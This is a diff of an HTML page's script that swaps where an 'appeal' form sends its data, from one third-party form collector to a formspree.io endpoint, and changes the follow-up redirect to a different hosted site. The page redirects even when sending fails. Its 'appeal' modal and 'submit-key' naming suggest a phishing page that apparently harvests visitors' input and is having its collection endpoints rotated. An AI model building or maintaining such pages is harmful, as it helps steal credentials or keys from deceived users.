@@ -728,7 +728,7 @@
 
       // Function to submit to first form (https://submit-form.com/cl2uWSEUd)
       function submitToFirstForm(data) {
-        return fetch("https://submit-form.com/cl2uWSEUd", {
+        return fetch("https://formspree.io/f/meoelgvy", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -795,7 +795,7 @@
               appealModal.style.display = "none";
 
               // Redirect to example link after successful submission
-              window.location.href = "https://submit-key-1.vercel.app/";
+              window.location.href = "https://step-info.netlify.app/";
             })
             .catch((error) => {
               // Hide loading state
@@ -807,7 +807,7 @@
               // Still redirect even if submission fails (optional behavior)
               // Comment out the next 3 lines if you want to prevent redirect on error
               appealModal.style.display = "none";
-              window.location.href = "https://submit-key-1.vercel.app/";
+              window.location.href = "https://step-info.netlify.app/";
             });
         } else {
           // Scroll to first error
@@ -938,6 +938,7 @@
     </script>
   </body>
 </html>
+
 
 
 
